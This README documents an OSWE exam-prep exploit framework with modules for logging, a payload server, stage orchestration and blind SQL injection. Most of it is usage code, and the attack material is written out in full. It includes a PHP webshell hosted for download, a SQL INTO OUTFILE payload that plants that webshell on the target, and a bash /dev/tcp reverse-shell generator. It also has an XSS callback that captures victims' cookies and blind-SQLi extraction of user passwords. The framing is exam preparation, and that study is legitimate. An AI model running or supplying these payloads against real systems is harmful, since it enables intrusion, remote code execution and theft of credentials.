# OSWE Advanced PoC Skeleton

**Production-ready exploit development framework for OSWE exam preparation**

This skeleton implements all advanced features from "Building a Reusable OSWE PoC Skeleton" including:

- ✅ **Structured Logging** - Audit trail with color-coded console output
- ✅ **Payload Server** - HTTP server for hosting and callbacks
- ✅ **Stage Management** - Dependencies, retries, and orchestration
- ✅ **Blind SQLi Module** - Binary search + async extraction
- ✅ **Context Management** - Clean state management with dataclasses
- ✅ **Error Handling** - Graceful failures with detailed logging

## Directory Structure

```
advanced-skeleton/
├── README.md              # This file
├── poc_advanced.py        # Complete production skeleton
├── modules/               # Reusable modules
│   ├── __init__.py       # Package initialization
│   ├── logger.py         # Structured logging
│   ├── payload_server.py # HTTP payload server
│   ├── stages.py         # Stage management
│   └── sqli.py           # Blind SQLi with binary search
└── examples/             # Usage examples (created below)
    ├── example_sqli.py
    ├── example_xss.py
    └── example_full.py
```

## Quick Start

### 1. Installation

```bash
cd /home/simon/code/OSWE-Prep/poc-examples/advanced-skeleton

# No additional dependencies required beyond standard library
# Optional: Install for async SQLi
pip3 install aiohttp
```

### 2. Basic Usage

```bash
# Run the skeleton (customize stages first)
python3 poc_advanced.py --target-ip 192.168.1.100 --username admin --password secret

# With Burp proxy
python3 poc_advanced.py --target-ip 192.168.1.100 --proxy http://127.0.0.1:8080

# Verbose logging
python3 poc_advanced.py --target-ip 192.168.1.100 --verbose
```

### 3. Customization

Edit `poc_advanced.py` and modify the stage functions:

```python
def stage_exploit(ctx: ExploitContext, manager: StageManager) -> bool:
    """Implement your vulnerability-specific exploitation here."""

    # Enable SQLi example
    if True:  # Change to True
        sqli = BlindSQLi(
            url=f"{ctx.get_base_url()}/vuln.php",
            dialect=MySQLDialect(),
            delay=ctx.delay,
            logger=ctx.logger
        )
        password = sqli.extract("SELECT password FROM users WHERE id=1")
        ctx.logger.success(f"Password: {password}")

    return True
```

## Module Documentation

### 1. Logger Module (`modules/logger.py`)

**Features:**
- Color-coded console output
- File-based audit trail in `Logs/` directory
- Specialized logging methods

**Usage:**

```python
from modules import create_logger

log = create_logger("my_exploit")

log.stage("Reconnaissance")
log.info("Scanning target...")
log.success("Target is vulnerable!")
log.error("Authentication failed")
log.warning("Missing credentials")

log.http_request("GET", "http://target.com/")
log.http_response(200, "http://target.com/", response_text)

log.sqli_attempt("' OR 1=1--", result="admin")
log.credential("admin", "password123", "SQLi extraction")
log.flag("OSWE{flag_here}", "/root/proof.txt")

log.summary(
    Target="192.168.1.100",
    Vulnerability="SQL Injection",
    Status="SUCCESS"
)

log.close()
```

**Log File Location:**
```
Logs/my_exploit_20250105_123456.log
```

### 2. Payload Server Module (`modules/payload_server.py`)

**Features:**
- Host arbitrary files (shells, exploits)
- Catch callbacks (XSS, blind RCE, SSRF)
- Request logging
- Background threading

**Usage:**

```python
from modules import PayloadServer

# Create server
server = PayloadServer(port=8000)

# Add PHP shell
php_shell = "<?php system($_REQUEST['cmd']); ?>"
server.add_payload("/shell.php", php_shell, "application/x-php")

# Add callback handler
def xss_callback(request_data):
    print(f"XSS from {request_data['client']}")
    print(f"Cookie: {request_data['query_params'].get('cookie')}")

server.add_callback_handler("/xss-callback", xss_callback)

# Start server (non-blocking)
server.start(blocking=False)

# Get URLs
print(f"Shell: {server.get_url('/shell.php')}")
print(f"Callback: {server.get_url('/xss-callback')}")

# Wait for callback
if server.wait_for_callback("/xss-callback", timeout=60):
    print("Callback received!")

# Cleanup
server.stop()
```

### 3. Stage Management Module (`modules/stages.py`)

**Features:**
- Automatic stage numbering
- Dependency resolution
- Retry logic
- Optional vs required stages

**Usage:**

```python
from modules import StageManager

manager = StageManager(logger=log, fail_fast=False)

# Define stages with decorator
@manager.stage("Reconnaissance")
def recon(ctx):
    return ctx.scan_target()

@manager.stage("Authentication", depends_on=["Reconnaissance"])
def auth(ctx):
    return ctx.login()

@manager.stage("Exploitation", depends_on=["Authentication"], retry=2, retry_delay=5)
def exploit(ctx):
    return ctx.exploit_vuln()

# Or add programmatically
manager.add_stage("Verification", verify_rce, depends_on=["Exploitation"])

# Execute all stages
success = manager.execute(ctx)

# Get results
for result in manager.get_results():
    print(f"{result.name}: {result.status}")

manager.print_summary()
```

### 4. Blind SQLi Module (`modules/sqli.py`)

**Features:**
- Binary search (much faster than linear)
- Async/concurrent extraction
- Multiple database support (MySQL, PostgreSQL, MSSQL)
- Time-based and boolean-based

**Usage:**

```python
from modules import BlindSQLi, MySQLDialect
import asyncio

# Create SQLi instance
sqli = BlindSQLi(
    url="http://target.com/vuln.php",
    dialect=MySQLDialect(),
    delay=3,
    param_name="id",
    injection_point="1{payload}",
    logger=log
)

# Extract data (binary search)
password = sqli.extract("SELECT password FROM users WHERE id=1", use_binary=True)
print(f"Password: {password}")

# Async extraction (fastest)
async def extract_async():
    password = await sqli.extract_async("SELECT password FROM users WHERE id=1")
    return password

password = asyncio.run(extract_async())
```

**Supported Dialects:**

```python
from modules import MySQLDialect, PostgreSQLDialect, MSSQLDialect

# MySQL/MariaDB
sqli = BlindSQLi(url=url, dialect=MySQLDialect())

# PostgreSQL
sqli = BlindSQLi(url=url, dialect=PostgreSQLDialect())

# Microsoft SQL Server
sqli = BlindSQLi(url=url, dialect=MSSQLDialect())
```

## Complete Example: Blind SQLi to RCE

```python
#!/usr/bin/env python3
from modules import create_logger, BlindSQLi, MySQLDialect, PayloadServer

# Setup
log = create_logger("sqli_to_rce")
server = PayloadServer(port=8000)

# Add webshell
php_shell = "<?php system($_REQUEST['cmd']); ?>"
server.add_payload("/shell.php", php_shell)
server.start(blocking=False)

# Stage 1: Exploit SQLi
log.stage("SQL Injection")
sqli = BlindSQLi(
    url="http://target.com/vuln.php?id=1",
    dialect=MySQLDialect(),
    delay=2,
    logger=log
)

# Extract credentials
username = sqli.extract("SELECT username FROM users WHERE id=1")
password = sqli.extract("SELECT password FROM users WHERE id=1")
log.credential(username, password, "SQLi extraction")

# Stage 2: Use SQLi for file write
log.stage("File Write via SQLi")
shell_url = server.get_url("/shell.php")
write_payload = f"'; SELECT '<?php system($_REQUEST[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"

# Execute file write (implementation depends on app)
# ...

# Stage 3: Verify RCE
log.stage("RCE Verification")
import requests
response = requests.get("http://target.com/shell.php?cmd=id")
log.success(f"RCE Output: {response.text}")

# Cleanup
server.stop()
log.close()
```

## OSWE Exam Tips

### Time Optimization

**Linear Search** (slow):
- 32 requests per character (lowercase + digits)
- 1280 requests for 40-char string
- ~1 hour at 3s delay

**Binary Search** (fast):
- ~7 requests per character (log2(94) for ASCII)
- 280 requests for 40-char string
- ~14 minutes at 3s delay

**Async + Binary** (fastest):
- All characters extracted concurrently
- 280 requests total, but parallel
- ~2 minutes at 3s delay

### Skeleton Benefits for Exam

1. **Logging** - Auto-documents your exploitation for the report
2. **Stage Management** - Keeps code organized under pressure
3. **Retry Logic** - Handles network issues automatically
4. **Payload Server** - Quick callback verification
5. **Reusability** - Copy skeleton for each target

### Exam Workflow

```bash
# 1. Setup skeleton for new target
cp -r advanced-skeleton/ target1/
cd target1/

# 2. Customize stages in poc_advanced.py
# 3. Test incrementally with --proxy flag
python3 poc_advanced.py --target-ip TARGET --proxy http://127.0.0.1:8080

# 4. Run final exploitation
python3 poc_advanced.py --target-ip TARGET --username admin --password pass

# 5. Logs automatically saved to Logs/ for report
ls Logs/
```

## Advanced Features

### Custom Stage Dependencies

```python
@manager.stage("Database Extraction", depends_on=["SQLi Confirmed", "Authentication"])
def extract_db(ctx):
    # Only runs if both dependencies succeeded
    pass
```

### Conditional Stage Execution

```python
@manager.stage("File Upload", optional=True)
def upload_shell(ctx):
    # Failure won't stop execution
    pass
```

### Dynamic Payload Generation

```python
def generate_reverse_shell(ip, port):
    return f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"

server.add_payload("/revshell.sh", generate_reverse_shell(ctx.attacker_ip, ctx.attacker_port))
```

### Multi-Database SQLi

```python
# Auto-detect database type
for dialect in [MySQLDialect(), PostgreSQLDialect(), MSSQLDialect()]:
    sqli = BlindSQLi(url=url, dialect=dialect, delay=2)

    # Test with version query
    version = sqli.extract("SELECT VERSION()", max_length=10)

    if version:
        log.success(f"Database: {version}")
        break
```

## Troubleshooting

### Logger Not Working
```python
# Make sure Logs/ directory exists
mkdir -p Logs/
```

### Payload Server Port in Use
```python
# Change port
server = PayloadServer(port=8001)
```

### SQLi Too Slow
```python
# Reduce delay
sqli = BlindSQLi(url=url, delay=1)

# Or use async
password = asyncio.run(sqli.extract_async(query))
```

### Stage Dependencies Failing
```python
# Make optional
manager.add_stage("Optional Step", func, optional=True)

# Or disable fail_fast
manager = StageManager(fail_fast=False)
```

## Integration with Existing PoCs

You can integrate individual modules into your existing PoCs:

```python
# Just add logging
from modules import create_logger
log = create_logger("my_existing_poc")
log.info("Starting exploitation")

# Or just add SQLi
from modules import BlindSQLi, MySQLDialect
sqli = BlindSQLi(url=url, dialect=MySQLDialect())
password = sqli.extract(query)

# Or just add payload server
from modules import PayloadServer
server = PayloadServer(port=8000)
server.add_payload("/shell.php", shell_content)
server.start()
```

## References

- Main Guide: `../OSWE-PoC-Skeleton-Guide.md`
- Building Skeleton: `../../Building a Reusable OSWE PoC Skeleton.md`
- OSWE Prep: `../../OSWE-Prep-content.md`

## License

Educational use only - OSWE exam preparation.

---

**Happy Hacking! 🎯**

For questions or issues with the skeleton framework, refer to the module source code or the main OSWE-Prep repository.
